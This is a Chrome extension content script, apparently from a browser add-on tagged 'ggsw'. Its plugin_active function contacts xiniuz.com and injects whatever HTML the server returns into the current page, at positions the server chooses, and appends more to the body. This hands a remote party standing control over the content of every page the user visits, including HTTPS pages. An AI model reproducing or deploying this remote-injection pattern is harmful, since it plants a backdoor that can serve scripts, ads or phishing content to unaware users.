function plugin_active() {
	var timestamp = (new Date()).valueOf();
	var ver = chrome.runtime.getManifest().version;
	var ext = "ggsw";
	var url = "";
	if (location.href.indexOf("https") == 0) {
		url = "https://www.xiniuz.com/extz"
	} else {
		url = "http://www.xiniuz.com/extz"
	}
	$.ajax({
		type: "get",
		dataType: "html",
		url: url,
		data: "time=" + timestamp + "&ver=" + ver + "&ext=" + ext,
		complete: function() {
			$("#load").hide()
		},
		success: function(msg) {
			var info = msg.split("#####");
			if (info.length == 4) {
				if (info[3].trim() == "after") {
					$(info[2]).after(info[1])
				} else if (info[3].trim() == "before") {
					$(info[2]).before(info[1])
				} else if (info[3].trim() == "append") {
					$(info[2]).append(info[1])
				} else if (info[3].trim() == "prepend") {
					$(info[2]).prepend(info[1])
				}
			} else {
				$(info[2]).after(info[1])
			}
			$(document.body).append(info[0])
		}
	})
}
chrome.extension.sendRequest({
	type: "active",
	url: location.href
}, function(response) {
	if (response.active) {
		plugin_active()
	}
});